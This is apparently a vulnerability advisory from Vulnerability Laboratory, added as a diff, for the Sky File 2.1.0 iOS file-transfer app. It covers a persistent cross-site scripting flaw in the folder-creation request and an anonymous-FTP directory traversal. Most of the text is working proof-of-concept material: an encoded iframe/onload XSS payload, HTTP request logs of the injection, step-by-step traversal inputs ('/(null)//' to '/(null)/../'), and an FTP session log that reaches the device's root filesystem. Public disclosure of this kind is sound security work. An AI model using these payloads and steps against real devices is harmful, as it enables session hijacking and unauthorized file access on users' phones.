@@ -1,0 +1,322 @@
+# Title: Sky File 2.1.0 iOS - Directory Traversal
+# Author: Vulnerability Laboratory
+# Date: 2020-04-21
+# Software Link: https://apps.apple.com/us/app/sky-file-wireless-transfer/id1236452210
+# CVE: N/A
+
+Document Title:
+===============
+Sky File v2.1.0 iOS - Multiple Web Vulnerabilities
+
+
+References (Source):
+====================
+https://www.vulnerability-lab.com/get_content.php?id=2207
+
+
+Common Vulnerability Scoring System:
+====================================
+7.2
+
+
+Affected Product(s):
+====================
+Jin Chen
+Product: Sky File v2.1.0 - (iOS) Mobile Web Application
+(https://apps.apple.com/us/app/sky-file-wireless-transfer/id1236452210)
+
+
+Vulnerability Disclosure Timeline:
+==================================
+2020-04-21: Public Disclosure (Vulnerability Laboratory)
+
+
+Technical Details & Description:
+================================
+1.1
+Multiple persistent cross site scripting vulnerabilities has been
+discovered in the official Sky File v2.1.0 mobile ios web-application.
+The vulnerability allows remote attackers to inject own malicious script
+codes with persistent attack vector to compromise browser to
+web-application requests from the application-side.
+
+The cross site vulnerability is located in the 'createFolder' module.
+Remote attackers with access to the ui via wifi are able
+to inject own malicious persistent script code to compromise the
+web-application or user credentials. The request method to
+inject is POST and the attack vector is located on the application-side.
+
+Successful exploitation of the vulnerability results session hijacking,
+persistent phishing, persistent external redirects  and
+application-side manipulation of the web context of the affected and
+connected device module.
+
+
+1.2
+A directory traversal web vulnerability has been discovered in the
+official Sky File v2.1.0 mobile ios web-application.
+The web vulnerability allows an attacker to unauthorized change the path
+or directory to access sensitive application data.
+
+The directory / path webvulnerability is located in the local ftp server
+configuration and path validation with the insecure
+access permissions. Normally the anonymous user account is only able to
+move inside the main app folder but not above to the
+web-server and root application files. In case of the issue remote
+attackers are able to connect with anonymous user account
+credentials to the wifi ftp server. After that the attacker can use a
+misconfiguration in the ftp server of the app path to
+transmit a `/null//` path commands after CWD and CDUP navigation via ftp
+client. Thus allows the attacker to finally
+unauthorized access the main root application path.
+
+Successful exploitation of the directory traversal vulnerability results
+in unauthorized file system access and information disclosure.
+
+
+Proof of Concept (PoC):
+=======================
+1.1
+The persistent script code inject vulnerability can be exploited by
+remote attackers with wifi network access with low user interaction.
+For security demonstration or to reproduce the web vulnerability follow
+the provided information and steps below to continue.
+
+
+PoC: Payload
+%2F%3E%22%3E%3Ciframe+src%3Devil.source+onload%3Dalert(%22PWND%22)%3E%3E%22%3E
+
+
+--- PoC Session Logs [POST] ---
+Status: 200[OK]
+POST http://localhost:10000/create
+Mime Type[application/json]
+   Request Header:
+      Host[localhost:10000]
+      User-Agent[Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0)
+Gecko/20100101 Firefox/52.0]
+      Accept[application/json, text/javascript, */*; q=0.01]
+      Accept-Language[de,en-US;q=0.7,en;q=0.3]
+      Accept-Encoding[gzip, deflate]
+      Content-Type[application/x-www-form-urlencoded; charset=UTF-8]
+      X-Requested-With[XMLHttpRequest]
+      Referer[http://localhost:10000/]
+      Content-Length[140]
+      Connection[keep-alive]
+   POST-Daten:
+
+path[%2F%3E%22%3E%3Ciframe+src%3Devil.source+onload%3Dalert(%22PWND%22)%3E%3E%22%3E]
+   Response Header:
+      Cache-Control[no-cache]
+      Content-Length[2]
+      Content-Type[application/json]
+      Connection[Close]
+      Server[GCDWebUploader]
+-
+Status: 200[OK]
+GET
+http://localhost:10000/list?path=%2F%3E%22%3E%3Ciframe+src%3Devil.source+onload%3Dalert(%22PWND%22)%3E%3E
+Mime Type[application/json]
+   Request Header:
+      Host[localhost:10000]
+      User-Agent[Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0)
+Gecko/20100101 Firefox/52.0]
+      Accept[application/json, text/javascript, */*; q=0.01]
+      Accept-Language[de,en-US;q=0.7,en;q=0.3]
+      Accept-Encoding[gzip, deflate]
+      X-Requested-With[XMLHttpRequest]
+      Referer[http://localhost:10000/]
+      Connection[keep-alive]
+   Response Header:
+      Cache-Control[no-cache]
+      Content-Length[2]
+      Content-Type[application/json]
+      Connection[Close]
+      Server[GCDWebUploader]
+-
+Status: 200[OK]
+GET http://localhost:10000/evil.source
+Mime Type[application/x-unknown-content-type]
+   Request Header:
+      Host[localhost:10000]
+      User-Agent[Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0)
+Gecko/20100101 Firefox/52.0]
+
+Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
+      Accept-Language[de,en-US;q=0.7,en;q=0.3]
+      Accept-Encoding[gzip, deflate]
+      Referer[http://localhost:10000/]
+      Connection[keep-alive]
+      Upgrade-Insecure-Requests[1]
+   Response Header:
+      Server[GCDWebUploader]
+      Connection[Close]
+
+
+
+1.2
+The directory traversal web vulnerability can be exploited by remote
+attackers with wifi network access without user interaction.
+For security demonstration or to reproduce the web vulnerability follow
+the provided information and steps below to continue.
+
+
+Manual steps to reproduce ...
+1. Open the ftp preview the visible folders
+2. Jump back to the the following path
+/private/var/mobile/Containers/Data/Application/A9124FFE-16D8-413B-83B7-4018B69AEB45/
+3. Include the payload /(null)// and refresh via list command
+4. You are now placed in an empty folder without permission to move
+5. Add to /(null)/../ to the path and refresh the client
+6. Path traversal successful to access the main app root path (./) that
+is normally not accessable
+7. Successful reproduce of the path traversal web vulnerability!
+
+
+PoC: Payload
+/(null)//  to  /(null)/../
+
+
+--- PoC Sessio Logs (FTP) ---
+[21:52:40] [R] 221- Data traffic for this session was 0 bytes in 0 files
+[21:52:40] [R] 221 Thank you for using the FTP service on localhost.
+[21:52:40] [R] Logged off: 192.168.2.116 (Duration: 26 seconds)
+[21:52:42] [R] Connecting to 192.168.2.116 -> IP=192.168.2.116 PORT=10001
+[21:52:42] [R] Connected to 192.168.2.116
+[21:52:42] [R] 220 iosFtp server ready.
+[21:52:42] [R] USER anonymous
+[21:52:42] [R] 331 Password required for (null)
+[21:52:42] [R] PASS (hidden)
+[21:52:42] [R] 230 User (null) logged in.
+[21:52:42] [R] SYST
+[21:52:42] [R] 215 UNIX Type: L8 Version: iosFtp 20080912
+[21:52:42] [R] FEAT
+[21:52:42] [R] 211-Features supported
+[21:52:42] [R]  UTF8
+[21:52:42] [R] 211 End
+[21:52:42] [R] OPTS UTF8 ON
+[21:52:42] [R] 200 Type set Opts to  UTF8.
+[21:52:42] [R] PWD
+[21:52:42] [R] 257
+"/private/var/mobile/Containers/Data/Application/A9124FFE-16D8-413B-83B7-4018B69AEB45/Documents/myFolder/iFolder"
+is the current directory.
+[21:52:42] [R] CWD /(null)/
+[21:52:42] [R] 550 CWD failed.
+[21:52:42] [R] PWD
+[21:52:42] [R] 257
+"/private/var/mobile/Containers/Data/Application/A9124FFE-16D8-413B-83B7-4018B69AEB45/Documents/myFolder/iFolder"
+is the current directory.
+[21:52:42] [R] PASV
+[21:52:42] [R] 227 Entering Passive Mode (192,168,2,116,39,252)
+[21:52:42] [R] Opening data connection IP: 192.168.2.116 PORT: 10236
+[21:52:42] [R] LIST -al
+[21:52:42] [R] 150 Opening ASCII mode data connection for '/bin/ls'.
+[21:52:42] [R] 226 Transfer complete.
+[21:52:42] [R] List Complete: 149 bytes in 0,08 seconds (0,1 KB/s)
+[21:52:43] [R] CDUP
+[21:52:43] [R] 250 CDUP command successful.
+[21:52:43] [R] PWD
+[21:52:43] [R] 257
+"/private/var/mobile/Containers/Data/Application/A9124FFE-16D8-413B-83B7-4018B69AEB45/Documents/myFolder"
+is the current directory.
+[21:52:43] [R] PASV
+[21:52:43] [R] 227 Entering Passive Mode (192,168,2,116,87,51)
+[21:52:43] [R] Opening data connection IP: 192.168.2.116 PORT: 22323
+[21:52:43] [R] LIST -al
+[21:52:43] [R] 150 Opening ASCII mode data connection for '/bin/ls'.
+[21:52:43] [R] 226 Transfer complete.
+[21:52:43] [R] List Complete: 308 bytes in 0,10 seconds (0,3 KB/s)
+[21:52:43] [R] CDUP
+[21:52:44] [R] 250 CDUP command successful.
+[21:52:44] [R] PWD
+[21:52:44] [R] 257
+"/private/var/mobile/Containers/Data/Application/A9124FFE-16D8-413B-83B7-4018B69AEB45/Documents"
+is the current directory.
+[21:52:44] [R] PASV
+[21:52:44] [R] 227 Entering Passive Mode (192,168,2,116,151,51)
+[21:52:44] [R] Opening data connection IP: 192.168.2.116 PORT: 38707
+[21:52:44] [R] LIST -al
+[21:52:44] [R] 150 Opening ASCII mode data connection for '/bin/ls'.
+[21:52:44] [R] 226 Transfer complete.
+[21:52:44] [R] List Complete: 127 bytes in 0,08 seconds (0,1 KB/s)
+[21:53:34] [R] CDUP
+[21:53:34] [R] 250 CDUP command successful.
+[21:53:34] [R] PWD
+[21:53:34] [R] 257
+"/private/var/mobile/Containers/Data/Application/A9124FFE-16D8-413B-83B7-4018B69AEB45"
+is the current directory.
+[21:53:34] [R] PASV
+[21:53:34] [R] 227 Entering Passive Mode (192,168,2,116,227,14)
+[21:53:34] [R] Opening data connection IP: 192.168.2.116 PORT: 58126
+[21:53:34] [R] LIST -al
+[21:53:34] [R] 150 Opening ASCII mode data connection for '/bin/ls'.
+[21:53:34] [R] 226 Transfer complete.
+[21:53:34] [R] List Complete: 312 bytes in 0,08 seconds (0,3 KB/s)
+[21:53:35] [R] CDUP
+[21:53:35] [R] 250 CDUP command successful.
+[21:53:35] [R] PWD
+[21:53:35] [R] 257 "(null)" is the current directory.
+[21:53:35] [R] PASV
+[21:53:35] [R] 227 Entering Passive Mode (192,168,2,116,159,14)
+[21:53:35] [R] Opening data connection IP: 192.168.2.116 PORT: 40718
+[21:53:35] [R] LIST -al
+[21:53:35] [R] 150 Opening ASCII mode data connection for '/bin/ls'.
+[21:53:35] [R] 226 Transfer complete.
+[21:53:35] [R] List Complete: 0 bytes in 0,07 seconds (0,0 KB/s)
+[21:53:35] [R] PASV
+[21:53:35] [R] 227 Entering Passive Mode (192,168,2,116,143,14)
+[21:53:35] [R] Opening data connection IP: 192.168.2.116 PORT: 36622
+[21:53:35] [R] LIST -al
+[21:53:35] [R] 150 Opening ASCII mode data connection for '/bin/ls'.
+[21:53:35] [R] 226 Transfer complete.
+[21:53:35] [R] List Complete: 0 bytes in 0,06 seconds (0,0 KB/s)
+[21:53:36] [R] CDUP
+[21:53:36] [R] 550 CDUP command failed.
+[21:53:41] [R] CWD /etc
+[21:53:41] [R] 250 CWD command successful.
+[21:53:41] [R] PWD
+[21:53:41] [R] 257 "(null)" is the current directory.
+[21:53:48] [R] CDUP
+[21:53:48] [R] 550 CDUP command failed.
+[21:53:51] [R] CWD /
+[21:53:51] [R] 250 CWD command successful.
+[21:53:51] [R] PWD
+[21:53:51] [R] 257 "/" is the current directory.
+[21:53:51] [R] PASV
+[21:53:51] [R] 227 Entering Passive Mode (192,168,2,116,221,173)
+[21:53:51] [R] Opening data connection IP: 192.168.2.116 PORT: 56749
+[21:53:51] [R] LIST -al
+[21:53:51] [R] 150 Opening ASCII mode data connection for '/bin/ls'.
+[21:53:51] [R] 226 Transfer complete.
+[21:53:51] [R] List Complete: 741 bytes in 0,10 seconds (0,7 KB/s)
+[21:54:02] [R] TYPE I
+[21:54:02] [R] 200 Type set to  I.
+
+Listing Path ./root
+- Applications
+- bin
+- cores
+- developer
+- Library
+- private
+- sbin
+- System
+- usr
+- etc
+- var
+- tmp
+
+
+Credits & Authors:
+==================
+Vulnerability-Lab -
+https://www.vulnerability-lab.com/show.php?user=Vulnerability-Lab
+Benjamin Kunz Mejri -
+https://www.vulnerability-lab.com/show.php?user=Benjamin%20K.M.
+
+
+
+
+
+-- 
+VULNERABILITY LABORATORY - RESEARCH TEAM
